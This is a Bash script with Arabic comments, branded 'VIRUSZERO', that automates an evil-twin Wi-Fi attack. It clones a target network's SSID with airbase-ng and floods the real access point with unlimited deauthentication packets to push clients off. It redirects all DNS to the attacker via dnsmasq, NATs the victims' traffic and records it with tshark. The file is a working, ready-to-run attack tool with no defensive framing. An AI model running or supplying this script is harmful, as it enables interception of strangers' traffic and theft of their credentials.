#!/bin/bash

# جلب اسم المستخدم الحالي أوتوماتيكياً
CURRENT_USER=$(whoami)

# الألوان للتنسيق
RED='\033[1;31m'
GREEN='\033[1;32m'
CYAN='\033[1;36m'
YELLOW='\033[1;33m'
NC='\033[0m'

# دالة واجهة البرنامج (Banner)
show_banner() {
    clear
    echo -e "${RED}"
    echo "██╗   ██╗██╗██████╗ ██╗   ██╗███████╗███████╗███████╗██████╗ "
    echo "██║   ██║██║██╔══██╗██║   ██║██╔════╝╚══███╔╝██╔════╝██╔══██╗"
    echo "██║   ██║██║██████╔╝██║   ██║███████╗  ███╔╝ █████╗  ██████╔╝"
    echo "╚██╗ ██╔╝██║██╔══██╗██║   ██║╚════██║ ███╔╝  ██╔══╝  ██╔══██╗"
    echo " ╚████╔╝ ██║██║  ██║╚██████╔╝███████║███████╗███████╗██║  ██║"
    echo "  ╚═══╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝"
    echo -e "${CYAN}             [ OWNER: VIRUSZERO | OPERATOR: $CURRENT_USER ] ${NC}"
}

# دالة إعادة النظام لطبيعته (Reset)
reset_system() {
    echo -e "${YELLOW}[*] Cleaning up and restoring defaults for $CURRENT_USER...${NC}"
    sudo killall dnsmasq airbase-ng aireplay-ng tshark 2>/dev/null
    sudo airmon-ng stop wlan0mon > /dev/null 2>&1
    sudo iptables -F
    sudo iptables -t nat -F
    sudo ifconfig at0 down 2>/dev/null
    echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null
    sudo sysctl -w net.ipv6.conf.all.disable_ipv6=0 > /dev/null
    [ -f dnsmasq.conf ] && rm dnsmasq.conf
    sudo systemctl restart NetworkManager
    echo -e "${GREEN}[+] System Restored!${NC}"
}

# دالة بدء الهجوم
start_attack() {
    show_banner
    echo -e "${RED}[!] Initializing attack sequence...${NC}"
    
    # تحضير المتطلبات
    sudo airmon-ng check kill > /dev/null 2>&1
    sudo systemctl stop systemd-resolved 2>/dev/null
    sudo airmon-ng start wlan0 > /dev/null 2>&1
    
    echo -e "${YELLOW}[!] Scanning for targets... (Press CTRL+C when locked)${NC}"
    sleep 2
    sudo airodump-ng wlan0mon

    read -p "Target SSID: " ESSID
    read -p "Target BSSID: " BSSID
    read -p "Target Channel: " CH

    # بناء إعدادات dnsmasq المتطورة (حل مشكلة REFUSED)
    cat <<EOF > dnsmasq.conf
interface=at0
dhcp-range=192.168.1.10,192.168.1.100,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
server=1.1.1.1
no-resolv
address=/#/192.168.1.1
EOF

    # تشغيل الهجوم
    x-terminal-emulator -T "VIRUSZERO: ENGINE" -e "sudo airbase-ng -e '$ESSID' -c $CH wlan0mon" &
    sleep 6
    
    sudo ifconfig at0 192.168.1.1 netmask 255.255.255.0 up
    sudo ifconfig at0 mtu 1400
    echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward > /dev/null
    sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1 > /dev/null

    sudo iptables -F
    sudo iptables -t nat -F
    sudo iptables -t nat -A POSTROUTING -o wlan0 -j MASQUERADE
    sudo iptables -A FORWARD -i at0 -j ACCEPT

    x-terminal-emulator -T "VIRUSZERO: LOGS" -e "sudo dnsmasq -C dnsmasq.conf -d -q" &
    x-terminal-emulator -T "VIRUSZERO: DEAUTH" -e "sudo aireplay-ng --deauth 0 -a $BSSID wlan0mon" &
    x-terminal-emulator -T "VIRUSZERO: SNIFFER" -e "sudo tshark -i at0 -w viruszero_capture.pcap" &
    
    echo -e "${GREEN}[+] Attack is LIVE. Monitoring traffic...${NC}"
}

# القائمة الرئيسية
while true; do
    show_banner
    echo -e "1) Start Attack"
    echo "2) Reset System"
    echo "3) Exit"
    echo -ne "${YELLOW}Choose Option: ${NC}"
    read choice
    case $choice in
        1) start_attack ;;
        2) reset_system ;;
        3) echo "Goodbye $CURRENT_USER!"; exit 0 ;;
        *) echo -e "${RED}Invalid!${NC}" ;;
    esac
done
